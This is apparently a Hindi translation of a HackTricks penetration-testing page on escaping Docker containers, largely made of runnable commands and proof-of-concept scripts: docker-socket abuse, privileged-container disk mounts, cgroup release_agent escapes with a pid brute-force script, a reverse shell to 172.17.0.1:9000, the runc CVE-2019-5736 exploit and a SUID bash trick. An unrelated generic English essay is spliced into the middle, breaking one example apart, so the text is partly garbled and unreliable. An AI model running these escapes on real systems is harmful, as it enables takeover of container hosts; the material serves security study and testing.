<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>


# एक कंटेनर क्या है

संक्षेप में, यह एक **अलग** **प्रक्रिया** है जिसके माध्यम से **cgroups** (प्रक्रिया द्वारा उपयोग किया जा सकने वाली चीजें, जैसे CPU और RAM) और **नेमस्पेस** (प्रक्रिया द्वारा देखा जा सकने वाली चीजें, जैसे निर्देशिकाएँ या अन्य प्रक्रियाएँ) के माध्यम से अलग होती है:
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# माउंट किए गए डॉकर सॉकेट

यदि आप किसी तरह से पाएं कि **डॉकर सॉकेट माउंट किया गया है** डॉकर कंटेनर के अंदर, तो आप इससे बाहर निकल सकेंगे।\
यह आमतौर पर डॉकर कंटेनर में होता है जो किसी कारणवश डॉकर डेमन से कनेक्ट होने की आवश्यकता होती है ताकि कार्रवाई कर सकें।
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
इस मामले में आप सामान्य डॉकर कमांड का उपयोग करके डॉकर डीमन के साथ संवाद कर सकते हैं:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
यदि **डॉकर सॉकेट अप्रत्याशित स्थान में है** तो आप इसके साथ अभी भी संवाद कर सकते हैं उपयोग करके **`docker`** कमांड का प्रयोग करके **`-H unix:///path/to/docker.sock`** पैरामीटर के साथ
{% endhint %}

# कंटेनर क्षमताएं

आपको कंटेनर की क्षमताओं की जांच करनी चाहिए, यदि इसमें निम्नलिखित में से कोई भी होती है, तो आप इससे बचने के लिए सक्षम हो सकते हैं: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

आप वर्तमान में कंटेनर की क्षमताओं की जांच कर सकते हैं:
```bash
capsh --print
```
इस पृष्ठ पर आप **लिनक्स क्षमताओं के बारे में और उन्हें दुरुपयोग करने के बारे में और अधिक जान सकते हैं**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# `--privileged` फ़्लैग

--privileged फ़्लैग कंटेनर को होस्ट उपकरणों तक पहुँच देने की अनुमति देता है।

## मैं रूट के मालिक हूँ

अच्छी तरह से कॉन्फ़िगर किए गए डॉकर कंटेनर्स **fdisk -l** जैसे कमांड की अनुमति नहीं देंगे। हालांकि, गलत रूप से कॉन्फ़िगर किए गए डॉकर कमांड में --privileged फ़्लैग निर्दिष्ट होने पर, होस्ट ड्राइव देखने की अनुमति प्राप्त की जा सकती है।

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

इसलिए, होस्ट मशीन पर काबिज़ होना बहुत आसान है:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
और वहां! अब आप होस्ट की फ़ाइल सिस्टम तक पहुंच सकते हैं क्योंकि यह `/mnt/hola` फ़ोल्डर में माउंट हो गया है।

{% code title="प्राथमिक PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% code title="दूसरा प्रमाण" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged` फ्लैग में बड़ी सुरक्षा समस्याओं को पेश करता है, और इस उत्पादन का उपयोग करने के लिए एक डॉकर कंटेनर शुरू करने की आवश्यकता होती है। इस फ्लैग का उपयोग करते समय, कंटेनरों को सभी उपकरणों का पूर्ण पहुंच होता है और उन्हें seccomp, AppArmor और Linux capabilities की प्रतिबंधन से वंचित कर दिया जाता है।

वास्तव में, `--privileged` इस तरीके के माध्यम से डॉकर कंटेनर से बाहर निकलने के लिए आवश्यक से अधिक अनुमतियां प्रदान करता है। वास्तव में, "केवल" आवश्यकताएं हैं:

1. हमें कंटेनर के अंदर रूट के रूप में चल रहे होना चाहिए
2. कंटेनर को `SYS_ADMIN` Linux capability के साथ चलाया जाना चाहिए
3. कंटेनर को AppArmor प्रोफ़ाइल की कमी होनी चाहिए, या फिर `mount` syscall की अनुमति देनी चाहिए
4. cgroup v1 वर्चुअल फ़ाइलसिस्टम को कंटेनर के अंदर read-write माउंट किया जाना चाहिए

`SYS_ADMIN` capability कंटेनर को माउंट syscall करने की अनुमति देती है (देखें [man 7 capabilities](https://linux.die.net/man/7/capabilities))। [डॉकर डिफ़ॉल्ट रूप से सीमित संख्या की capabilities के साथ कंटेनर शुरू करता है](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) और `SYS_ADMIN` capability को सक्षम नहीं करता है क्योंकि इसके सुरक्षा जोखिमों के कारण।

इसके अलावा, डॉकर [डिफ़ॉल्ट रूप से `docker-default` AppArmor पॉलिसी के साथ कंटेनर शुरू करता है](https://docs.docker.com/engine/security/apparmor/#understand-the-policies), जो [mount syscall का उपयोग करने से रोकता है](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) जबकि कंटेनर `SYS_ADMIN` के साथ चलाया जाता है।

यदि कंटेनर निम्नलिखित फ्लैग के साथ चलाया जाता है, तो यह तकनीक के प्रति संक्रमित हो सकता है: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## प्रूफ ऑफ कॉन्सेप्ट को विचारशील बनाना

अब जब हमें इस तकनीक का उपयोग करने की आवश्यकताएं समझ में आ गई हैं और हमने प्रूफ ऑफ कॉन्सेप्ट उत्पादन को संशोधित किया है, चलिए इसे लाइन-बाइ-लाइन विश्लेषण करके देखें कि यह कैसे काम करता है।

इस उत्पादन को ट्रिगर करने के लिए हमें एक cgroup की आवश्यकता होती है जहां हम `release_agent` फ़ाइल बना सकते हैं और सभी प्रक्रियाओं को मारकर `release_agent` आह्वान कर सकते हैं। इसे करने का सबसे आसान तरीका एक cgroup नियंत्रक माउंट करना है और एक बच्चा cgroup बनाना है।

इसके लिए, हम एक `/tmp/cgrp` निर्देशिका बनाते हैं, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup नियंत्रक माउंट करते हैं और एक बच्चा cgroup बनाते हैं (इस उदाहरण के लिए "x" नामित)। हालांकि हर cgroup नियंत्रक का परीक्षण नहीं किया गया है, यह तकनीक अधिकांश cgroup नियंत्रकों के साथ काम करनी चाहिए।

यदि आप इसे फ़ॉलो कर रहे हैं और "mount: /tmp/cgrp: special device cgroup does not exist" मिलता है, तो इसका कारण है कि आपके सेटअप में RDMA cgroup नियंत्रक नहीं है। इसे ठीक करने के लिए `rdma` को `memory` में बदलें। हम RDMA का उपयोग कर रहे हैं क्योंकि मूल PoC केवल इसके साथ काम करने के लिए डिज़ाइन किया गया था।

ध्यान दें कि cgroup नियंत्रक सार्वभौमिक संसाधन हैं जो विभिन्न अनुमतियों के साथ कई बार माउंट किए जा सकते हैं और एक माउंट में किए गए परिवर्तन दूसरे माउंट पर लागू होंगे।

हम नीचे "x" बच्चा cgroup के निर्माण और उसकी निर्देशिका सूची देख सकते हैं।
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
अगले, हम "x" सीग्रुप के रिलीज़ होने पर सीग्रुप सूचनाएं सक्षम करते हैं, इसके लिए हम उसके `notify_on_release` फ़ाइल में 1 लिखकर करते हैं। हम भी RDMA सीग्रुप रिलीज़ एजेंट को सेट करते हैं ताकि वह `/cmd` स्क्रिप्ट को निष्पादित कर सके - जिसे हम बाद में कंटेनर में बनाएंगे - होस्ट पर `release_agent` फ़ाइल में होस्ट पर `/cmd` स्क्रिप्ट पथ लिखकर। इसे करने के लिए, हम कंटेनर के पथ को `/etc/mtab` फ़ाइल से होस्ट पर प्राप्त करेंगे।

हम कंटेनर में जो फ़ाइलें जोड़ते हैं या संशोधित करते हैं, वे होस्ट पर मौजूद होती हैं, और इन्हें दोनों दुनियों से संशोधित किया जा सकता है: कंटेनर में पथ और होस्ट पर उनका पथ।

इन कार्रवाइयों को नीचे देखा जा सकता है:
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
नोट करें `/cmd` स्क्रिप्ट के पथ को, जिसे हम होस्ट पर बनाने जा रहे हैं:
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
अब, हम `/cmd` स्क्रिप्ट बनाते हैं जिसके द्वारा यह `ps aux` कमांड को निष्पादित करेगा और इसका आउटपुट `/output` में संग्रहीत करेगा, होस्ट पर आउटपुट फ़ाइल के पूर्ण पथ को निर्दिष्ट करके। अंत में, हम भी `/cmd` स्क्रिप्ट को प्रिंट करते हैं ताकि हम इसकी सामग्री देख सकें:
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
अंत में, हम एक प्रक्रिया उत्पन्न करके हमला को क्रियान्वित कर सकते हैं जो "x" बाल बच्चा समूह के अंदर तत्काल खत्म हो जाती है। "/bin/sh" प्रक्रिया बनाकर और इसका पीआईडी "x" बाल बच्चा समूह निर्देशिका में `cgroup.procs` फ़ाइल में लिखकर, मेजबान पर स्क्रिप्ट `/bin/sh` के बाद निष्पादित होगी। मेजबान पर किए गए `ps aux` के आउटपुट को फिर `/output` फ़ाइल में कंटेनर के अंदर सहेजा जाता है:
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` फ्लैग v2

पिछले PoCs ठीक काम करते हैं जब कंटेनर को एक स्टोरेज ड्राइवर के साथ कॉन्फ़िगर किया जाता है जो माउंट पॉइंट का पूरा होस्ट पथ उजागर करता है, उदाहरण के लिए `overlayfs`, हालांकि हाल ही में मुझे कुछ कॉन्फ़िगरेशन मिली जिनमें होस्ट फ़ाइल सिस्टम माउंट पॉइंट स्पष्ट रूप से उजागर नहीं होता था।

## काटा कंटेनर्स
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) डिफ़ॉल्ट रूप से `9pfs` के माध्यम से कंटेनर की रूट फ़ाइल सिस्टम को माउंट करता है। इससे कटा कंटेनर वर्चुअल मशीन में कंटेनर फ़ाइल सिस्टम के स्थान के बारे में कोई जानकारी प्रकट नहीं होती है।

\* कटा कंटेनर्स के बारे में अधिक जानकारी एक भविष्य के ब्लॉग पोस्ट में।

## डिवाइस मैपर
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
मैंने एक लाइव पर्यावरण में इस रूट माउंट के साथ एक कंटेनर देखा, मुझे लगता है कि कंटेनर एक विशेष `devicemapper` स्टोरेज-ड्राइवर कॉन्फ़िगरेशन के साथ चल रहा था, लेकिन इस समय तक मुझे एक परीक्षण पर्यावरण में इस व्यवहार को पुनर्निर्माण करने में असमर्थता हुई है।

## एक वैकल्पिक PoC

स्पष्ट है कि इन मामलों में कंटेनर फ़ाइलों के पथ की पहचान करने के लिए पर्याप्त जानकारी नहीं होती है, इसलिए फेलिक्स के PoC का उपयोग नहीं किया जा सकता है। हालांकि, हम थोड़ी तर्कशक्ति के साथ इस हमले को अभी भी कार्यान्वित कर सकते हैं।

एकमात्र जरूरी जानकारी यह है कि कंटेनर में एक फ़ाइल को कंटेनर होस्ट के संबंध में पूरा पथ, संबंधित होने के लिए चाहिए। कंटेनर के भीतर माउंट पॉइंट्स से इसे पहचानने के बजाय हमें अन्य कहीं देखना होगा।

### Proc की मदद <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

लिनक्स `/proc` प्सेडो-फ़ाइलसिस्टम सिस्टम पर चल रहे सभी प्रक्रियाओं के लिए कर्नल प्रक्रिया डेटा संरचनाएँ प्रकट करता है, जिनमें से कुछ एक कंटेनर के भीतर उदाहरण के रूप में अलग नेमस्पेस में चल रहे होते हैं। इसे कंटेनर में एक कमांड चलाकर और होस्ट पर प्रक्रिया के `/proc` निर्देशिका तक पहुँचकर दिखाया जा सकता है:Container
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_एक बात कहूं, `/proc/<pid>/root` डेटा संरचना एक ऐसी थी जिसने मुझे बहुत समय तक भ्रमित किया, मैं कभी समझ नहीं सका कि `/` के लिए एक प्रतीकी लिंक होना कितना उपयोगी हो सकता है, जब तक मैंने मैन पेज में वास्तविक परिभाषण को पढ़ा नहीं:_

> /proc/\[pid]/root
>
> UNIX और Linux में प्रतिप्रोसेस फ़ाइलसिस्टम की एक प्रति को समर्थन किया जाता है, जिसे chroot(2) सिस्टम कॉल द्वारा सेट किया जाता है। यह फ़ाइल एक प्रतीकी लिंक है जो प्रक्रिया के रूट निर्देशिका को पॉइंट करता है, और exe और fd/\* की तरह व्यवहार करता है।
>
> हालांकि ध्यान दें कि यह फ़ाइल केवल एक प्रतीकी लिंक नहीं है। यह प्रक्रिया खुद की तरह फ़ाइलसिस्टम का एक समान दृश्य प्रदान करता है (नेमस्पेस और प्रति-प्रक्रिया माउंट की सेट सहित)।

`/proc/<pid>/root` प्रतीकी लिंक को कंटेनर में किसी भी फ़ाइल के लिए होस्ट संबंधित पथ के रूप में उपयोग किया जा सकता है:Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
यह आक्रमण के लिए आवश्यकता को बदलता है, जो कंटेनर में एक फ़ाइल के पूर्ण पथ को, कंटेनर होस्ट के संबंध में जानने की आवश्यकता से, किसी भी प्रक्रिया के pid को जानने की आवश्यकता को बदलता है।

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

यह वास्तव में आसान है, लिनक्स में प्रक्रिया आईडी संख्यात्मक होते हैं और लगातार आईडी आवंटित की जाती है। `init` प्रक्रिया को प्रक्रिया आईडी `1` के रूप में आवंटित किया जाता है और सभी आगामी प्रक्रियाओं को आवंटित आईडी दी जाती है। कंटेनर में एक प्रक्रिया के अंदर होस्ट प्रक्रिया आईडी की पहचान करने के लिए, एक ब्रूट फ़ोर्स आवंटित खोज का उपयोग किया जा सकता है: कंटेनर
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Docker Breakout

## Introduction

Docker is a popular containerization platform that allows you to run applications in isolated environments called containers. However, misconfigurations or vulnerabilities in Docker can lead to privilege escalation attacks, allowing an attacker to break out of the container and gain access to the underlying host system.

In this guide, we will explore various techniques that can be used to break out of a Docker container and escalate privileges on the host system.

## Docker Socket

By default, Docker communicates with the Docker daemon using a Unix socket located at `/var/run/docker.sock`. This socket file has read and write permissions for the `docker` group, allowing any user in that group to interact with the Docker daemon.

If an attacker gains access to the Docker socket, they can execute Docker commands as the `root` user, effectively bypassing any container isolation. This can be achieved through various means, such as exploiting a vulnerable container or gaining access to the host system.

To exploit this vulnerability, an attacker can mount the Docker socket inside a container and execute Docker commands from within the container. This allows them to run privileged containers, access host resources, and potentially gain root access on the host system.

## Privileged Containers

Docker allows you to run containers with elevated privileges using the `--privileged` flag. When a container is run with this flag, it has access to all devices on the host system, effectively bypassing any container isolation.

If an attacker gains access to a privileged container, they can leverage this access to escalate privileges on the host system. They can modify host files, execute arbitrary commands, and potentially gain root access.

To exploit this vulnerability, an attacker can either gain access to an existing privileged container or create a new privileged container themselves. Once inside the privileged container, they can execute commands with elevated privileges and potentially gain control over the host system.

## Container Escape

In some cases, it may be possible to escape the confines of a Docker container and gain access to the host system. This can be achieved through various means, such as exploiting kernel vulnerabilities, misconfigurations, or insecure container configurations.

If an attacker successfully escapes a Docker container, they can execute commands on the host system with the privileges of the container. This can allow them to access sensitive files, modify system configurations, and potentially gain root access on the host system.

To exploit this vulnerability, an attacker needs to identify and exploit a vulnerability or misconfiguration that allows them to break out of the container. This can be a complex process and often requires a deep understanding of the underlying system and its vulnerabilities.

## Conclusion

Privilege escalation attacks in Docker can have serious consequences, allowing an attacker to gain unauthorized access to the host system. It is important to follow security best practices when using Docker, such as restricting access to the Docker socket, avoiding the use of privileged containers, and regularly updating Docker and its dependencies to patch any vulnerabilities.

By understanding the various techniques used in Docker breakout attacks, you can better protect your Docker environments and prevent unauthorized access to your host systems.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### सब कुछ मिलाकर रखना <a href="putting-it-all-together" id="putting-it-all-together"></a>

इस हमले को पूरा करने के लिए brute force तकनीक का उपयोग किया जा सकता है ताकि `/proc/<pid>/root/payload.sh` पथ के लिए pid को अनुमान लगाया जा सके, प्रत्येक अवधि में अनुमानित pid पथ को cgroups `release_agent` फ़ाइल में लिखा जाए, `release_agent` को ट्रिगर किया जाए, और देखें कि क्या एक आउटपुट फ़ाइल बनाई जाती है।

इस तकनीक के साथ एकमात्र सावधानी यह है कि यह किसी भी तरीके से छिपा हुआ नहीं है, और pid गिनती को बहुत ऊँचा कर सकता है। क्योंकि कोई लंबे समय तक चलने वाली प्रक्रियाएं चलाई नहीं जाती हैं, इसलिए यह संभावित रूप से सुरक्षितता समस्याओं का कारण नहीं बनेगा, लेकिन इस पर मुझे न लिखें।

नीचे दिए गए PoC में इन तकनीकों का अमल किया गया है ताकि cgroups `release_agent` की कार्यक्षमता का उपयोग करके एक अधिक सामान्य हमला प्रदान किया जा सके:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
एक प्रिविलेज्ड कंटेनर के भीतर PoC को निष्पादित करने से आउटपुट इसके समान होना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Runc अपशिष्ट (CVE-2019-5736)

यदि आप `docker exec` को रूट के रूप में निष्पादित कर सकते हैं (संभवतः sudo के साथ), तो आप CVE-2019-5736 का दुरुपयोग करके एक कंटेनर से बाहर निकलकर विशेषाधिकारों को बढ़ाने का प्रयास कर सकते हैं (यहां दुरुपयोग [यहां](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go) है)। यह तकनीक मूल रूप से **मेज़बान** के _**/bin/sh**_ बाइनरी को **कंटेनर** से **अधिलेखित** करेगी, इसलिए कोई भी docker exec को निष्पादित करने वाला व्यक्ति प्रायोजन को ट्रिगर कर सकता है।

प्रायोजन को अनुरूप बदलें और `go build main.go` के साथ main.go को बनाएं। परिणामस्वरूपी बाइनरी को निष्पादन के लिए डॉकर कंटेनर में रखा जाना चाहिए।\
निष्पादन के दौरान, जैसे ही यह `[+] Overwritten /bin/sh successfully` प्रदर्शित करता है, आपको मेज़बान मशीन से निम्नलिखित को निष्पादित करना होगा:

`docker exec -it <container-name> /bin/sh`

इससे main.go फ़ाइल में मौजूद प्रायोजन को ट्रिगर किया जाएगा।

अधिक जानकारी के लिए: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# डॉकर ऑथ प्लगइन बाईपास

कुछ मौकों में, सिस्टम व्यवस्थापक डॉकर में कुछ प्लगइन स्थापित कर सकता है ताकि कम विशेषाधिकार वाले उपयोगकर्ता विशेषाधिकारों को बढ़ाने के बिना डॉकर के साथ संवाद कर सकें।

## अनुमति नहीं है `run --privileged`

इस मामले में सिस्टम व्यवस्थापक ने उपयोगकर्ताओं को **वॉल्यूम माउंट करने और `--privileged` फ़्लैग के साथ कंटेनर चलाने** या कंटेनर को कोई अतिरिक्त क्षमता नहीं दी है:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
यहां, एक उपयोगकर्ता **चल रहे कंटेनर के अंदर एक शैल बना सकता है और इसे अतिरिक्त अधिकार दे सकता है**:
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
अब, उपयोगकर्ता पहले चर्चित तकनीकों में से किसी भी तकनीक का उपयोग करके कंटेनर से बाहर निकल सकता है और होस्ट में विशेषाधिकारों को बढ़ा सकता है।

## माउंट योग्य फ़ोल्डर

इस मामले में सिसएडमिन ने उपयोगकर्ताओं को `--privileged` फ़्लैग के साथ कंटेनर चलाने से रोक दिया या कंटेनर को किसी अतिरिक्त क्षमता का प्रदान करने से इंकार किया है, और उसने केवल `/tmp` फ़ोल्डर को माउंट करने की अनुमति दी है:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
ध्यान दें कि शायद आप `/tmp` फ़ोल्डर को माउंट नहीं कर सकते हैं, लेकिन आप एक **अलग लिखने योग्य फ़ोल्डर** को माउंट कर सकते हैं। आप निम्नलिखित कमांड का उपयोग करके लिखने योग्य निर्देशिकाओं को खोज सकते हैं: `find / -writable -type d 2>/dev/null`

**ध्यान दें कि एक लिनक्स मशीन में सभी निर्देशिकाएं suid बिट का समर्थन नहीं करेंगी!** suid बिट का समर्थन करने वाले निर्देशिकाओं की जांच करने के लिए `mount | grep -v "nosuid"` कमांड चलाएं। उदाहरण के लिए, आमतौर पर `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` और `/var/lib/lxcfs` suid बिट का समर्थन नहीं करते हैं।

